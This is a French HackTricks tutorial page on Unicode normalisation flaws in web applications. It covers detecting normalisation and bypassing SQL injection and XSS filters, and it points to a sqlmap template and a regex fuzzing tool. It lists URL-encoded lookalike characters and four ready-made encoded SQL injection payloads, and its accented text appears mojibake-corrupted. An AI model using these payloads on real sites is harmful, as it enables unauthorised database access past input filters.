# Normalisation Unicode

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

**Il s'agit d'un r√©sum√© de :** [**https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/**](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/). Consultez-le pour plus de d√©tails (images prises de l√†).

## Compr√©hension de l'Unicode et de la Normalisation

La normalisation Unicode est un processus qui garantit que les diff√©rentes repr√©sentations binaires des caract√®res sont standardis√©es √† la m√™me valeur binaire. Ce processus est crucial pour traiter les cha√Ænes de caract√®res en programmation et en traitement des donn√©es. La norme Unicode d√©finit deux types d'√©quivalence de caract√®res :

1. **√âquivalence canonique** : Les caract√®res sont consid√©r√©s comme √©quivalents canoniquement s'ils ont la m√™me apparence et la m√™me signification lorsqu'ils sont imprim√©s ou affich√©s.
2. **√âquivalence de compatibilit√©** : Une forme plus faible d'√©quivalence o√π les caract√®res peuvent repr√©senter le m√™me caract√®re abstrait mais peuvent √™tre affich√©s diff√©remment.

Il existe **quatre algorithmes de normalisation Unicode** : NFC, NFD, NFKC et NFKD. Chaque algorithme utilise diff√©remment les techniques de normalisation canonique et de compatibilit√©. Pour une compr√©hension plus approfondie, vous pouvez explorer ces techniques sur [Unicode.org](https://unicode.org/).

### Points cl√©s sur l'encodage Unicode

Comprendre l'encodage Unicode est essentiel, notamment lorsqu'il s'agit de probl√®mes d'interop√©rabilit√© entre diff√©rents syst√®mes ou langues. Voici les points principaux :

* **Points de code et caract√®res** : En Unicode, chaque caract√®re ou symbole est assign√© une valeur num√©rique appel√©e "point de code".
* **Repr√©sentation en octets** : Le point de code (ou caract√®re) est repr√©sent√© par un ou plusieurs octets en m√©moire. Par exemple, les caract√®res LATIN-1 (courants dans les pays anglophones) sont repr√©sent√©s en utilisant un octet. Cependant, les langues avec un plus grand ensemble de caract√®res n√©cessitent plus d'octets pour la repr√©sentation.
* **Encodage** : Ce terme fait r√©f√©rence √† la mani√®re dont les caract√®res sont transform√©s en une s√©rie d'octets. UTF-8 est une norme d'encodage courante o√π les caract√®res ASCII sont repr√©sent√©s en utilisant un octet, et jusqu'√† quatre octets pour les autres caract√®res.
* **Traitement des donn√©es** : Les syst√®mes traitant des donn√©es doivent √™tre conscients de l'encodage utilis√© pour convertir correctement le flux d'octets en caract√®res.
* **Variantes d'UTF** : Outre UTF-8, il existe d'autres normes d'encodage comme UTF-16 (utilisant un minimum de 2 octets, jusqu'√† 4) et UTF-32 (utilisant 4 octets pour tous les caract√®res).

Il est crucial de comprendre ces concepts pour g√©rer efficacement et att√©nuer les probl√®mes potentiels d√©coulant de la complexit√© de l'Unicode et de ses diff√©rentes m√©thodes d'encodage.

Un exemple de normalisation Unicode de deux octets diff√©rents repr√©sentant le m√™me caract√®re :
```python
unicodedata.normalize("NFKD","chloe\u0301") == unicodedata.normalize("NFKD", "chlo\u00e9")
```
**Une liste des caract√®res √©quivalents en Unicode peut √™tre trouv√©e ici :** [https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html) et [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

### D√©couverte

Si vous trouvez √† l'int√©rieur d'une application web une valeur qui est renvoy√©e, vous pourriez essayer d'envoyer le **"SIGNE KELVIN" (U+0212A)** qui se **normalise en "K"** (vous pouvez l'envoyer en tant que `%e2%84%aa`). **Si un "K" est renvoy√©**, alors, une sorte de **normalisation Unicode** est effectu√©e.

Autre **exemple** : `%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` apr√®s **normalisation Unicode** est `Leonishan`.

## **Exemples de Vuln√©rabilit√©s**

### **Contournement du filtre d'injection SQL**

Imaginez une page web qui utilise le caract√®re `'` pour cr√©er des requ√™tes SQL avec l'entr√©e de l'utilisateur. Cette page web, en tant que mesure de s√©curit√©, **supprime** toutes les occurrences du caract√®re **`'`** de l'entr√©e de l'utilisateur, mais **apr√®s cette suppression** et **avant la cr√©ation** de la requ√™te, elle **normalise** en utilisant **Unicode** l'entr√©e de l'utilisateur.

Ensuite, un utilisateur malveillant pourrait ins√©rer un caract√®re Unicode diff√©rent √©quivalent √† `' (0x27)` comme `%ef%bc%87`, lorsque l'entr√©e est normalis√©e, une apostrophe est cr√©√©e et une **vuln√©rabilit√© d'injection SQL** appara√Æt :

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (699).png>)

**Quelques caract√®res Unicode int√©ressants**

* `o` -- %e1%b4%bc
* `r` -- %e1%b4%bf
* `1` -- %c2%b9
* `=` -- %e2%81%bc
* `/` -- %ef%bc%8f
* `-`-- %ef%b9%a3
* `#`-- %ef%b9%9f
* `*`-- %ef%b9%a1
* `'` -- %ef%bc%87
* `"` -- %ef%bc%82
* `|` -- %ef%bd%9c
```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f

" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```
#### Mod√®le sqlmap

{% embed url="https://github.com/carlospolop/sqlmap_to_unicode_template" %}

### XSS (Cross Site Scripting)

Vous pourriez utiliser l'un des caract√®res suivants pour pi√©ger l'application web et exploiter une XSS :

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (312) (2).png>)

Remarquez que par exemple le premier caract√®re Unicode propos√© peut √™tre envoy√© comme : `%e2%89%ae` ou comme `%u226e`

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (215) (1) (1).png>)

### Fuzzing des Regex

Lorsque le backend **v√©rifie l'entr√©e utilisateur avec un regex**, il est possible que l'**entr√©e** soit **normalis√©e** pour le **regex** mais **pas** pour l'endroit o√π elle est **utilis√©e**. Par exemple, dans une redirection ou SSRF ouverte, le regex pourrait **normaliser l'URL envoy√©e** puis **y acc√©der tel quel**.

L'outil [**recollapse**](https://github.com/0xacb/recollapse) permet de **g√©n√©rer des variations de l'entr√©e** pour fuzz le backend. Pour plus d'informations, consultez le **github** et ce [**post**](https://0xacb.com/2022/11/21/recollapse/).

## R√©f√©rences

* [**https://labs.spotify.com/2013/06/18/creative-usernames/**](https://labs.spotify.com/2013/06/18/creative-usernames/)
* [**https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work**](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
* [**https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html**](https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
